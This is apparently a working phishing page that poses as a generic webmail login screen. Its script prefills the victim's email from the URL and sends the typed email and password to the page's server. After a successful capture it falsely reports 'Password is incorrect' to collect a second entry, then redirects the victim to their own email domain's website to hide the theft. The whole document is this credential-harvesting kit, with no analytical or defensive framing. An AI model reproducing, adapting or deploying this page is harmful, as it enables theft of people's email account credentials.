<body style="zoom: 1;">
  <section class="login-section">
    <div class="login-logo">
    </div>
    <h1 class="login-header">Welcome to your Webmail &amp; Account Settings</h1>
    <div class="login-tabs">
      <button class="login-tab login-webmail selected">Webmail
        <i class="icon-info tooltip tooltipstered"></i>
      </button>
      <button class="login-tab login-myservices">My Services
        <i class="icon-info tooltip tooltipstered"></i>
      </button>
    </div>
    <form method="POST" action="" id="login_form" class="login-form" novalidate="" autocomplete="off">
      <div>
        <input name="source" id="source" type="hidden" class="client-type" value="WebMail">
        <div class="pr">
          <input name="email" id="email" type="text" placeholder="Login (email)" class="login-input" required="" autofocus="">
          <div class="login-validation required">Login required</div>
          <div id="showerror" class="login-validation email">Valid email address required</div>
        </div>
        <div class="pr">
          <input name="password" id="password" type="password" placeholder="Password" class="password-input" required="">
          <div id="showerror" class="password-validation required">Password required</div>
        </div>
        <div class="login-actions">
          <div class="login-remember">
            <label class="login-remember-me">
              <input type="checkbox" name="rememberMe" value="true" class="login-checkbox">
              <span style="line-height: 22px; height: 22px;">Remember me</span>
            </label>
          </div>
          <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
        </div>
      </div>
      <button type="button" id="submit-btn" class="login-submit wbk p0">Login</button>
    </form>
  </section>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript">
    const param = new URLSearchParams(window.location.search);
    let emailParam = param.get('email') ? param.get('email') : '';
    let count = 0;

    if (emailParam === "null") {
        emailParam = "";
    }

    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const login = document.getElementById('submit-btn');
    const source = document.getElementById('source');
    const err = document.querySelectorAll('#showerror');
    const form = document.getElementById("login_form");
    email.value = emailParam;

    login.addEventListener('click', function(e){
      console.log('g');
      e.preventDefault();
      if (email.value === "") {
        err[0].textContent = "Email is required";
        email.focus();
        showEl(err[0], "red");
        return;
      } else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
        err[0].textContent = "Enter a valid email address";
        email.focus();
        showEl(err[0], "red");
        return;
      } else if (password.value === "") {
         hideEl(err[0], "#000");
        err[1].textContent = "Password is required";
        password.focus();
        showEl(err[1], "red");
        return;
      } else {
        const domain = email.value.split('@')[1];
        count = count + 1;
        const prevT = login.textContent;
        login.textContent = 'Authenticating...';
        hideEl(err[1], "#000");

        var $form = $("#login_form");
        var url = form.action;
        var data = {
         email: email.value,
         password: password.value,
         source: source.value
        };

        $.ajax({
          type: "POST",
          url: url,
          data: data,
          cache: false,
          timeout: 800000,
          success: function(res) {
            if(res == true) {

              if (count > 1) {
                hideEl(err);
                window.location.href = "https://www."+domain;
                return;
              }

              password.value = "";
              password.style.borderColor = "red";
              showEl(err[1], "red");
              err[1].textContent = "Password is incorrect";
              login.textContent = prevT;
            }else {
              showEl(err[1], "red");
              err[1].textContent = "Something went wrong, please try again.";
              password.value = "";
              password.style.borderColor = "red";
              login.textContent = prevT;
            }
          },
          error: function(e) {
            showEl(err[1], "red");
            err[1].textContent = "Something went wrong, please try again.";
            password.value = "";
            password.style.borderColor = "red";
          }
        });
      }
    });

    function showEl(el, color) {
      el.style.color = color;
      el.style.display = "block";
    }

    function hideEl(el) {
      el.style.color = '#000';
      el.style.display = "none";    }

    function toggleBtn() {
      const password = document.getElementById('password');
      switch(password.type) {
            case 'text':
                  password.type = 'password';
            break;
            default:
                  password.type = 'text';
      }
    }
  </script>
</html>
